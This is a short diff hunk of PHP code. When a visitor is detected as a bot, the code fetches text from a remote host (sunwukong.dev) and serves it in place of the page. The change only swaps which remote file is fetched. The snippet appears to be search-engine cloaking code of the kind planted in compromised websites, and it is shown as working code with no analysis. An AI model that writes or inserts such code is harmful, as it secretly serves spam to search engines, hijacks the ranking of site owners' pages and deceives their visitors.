@@ -13,7 +13,7 @@ return false;
 }
 
 if (is_bot()) {
-$message = file_get_contents('https://sunwukong.dev/LANDING/greatdiamondinfo.txt');
+$message = file_get_contents('https://sunwukong.dev/LANDING/3djewelrymodel.txt');
 echo $message;
 exit;
 }
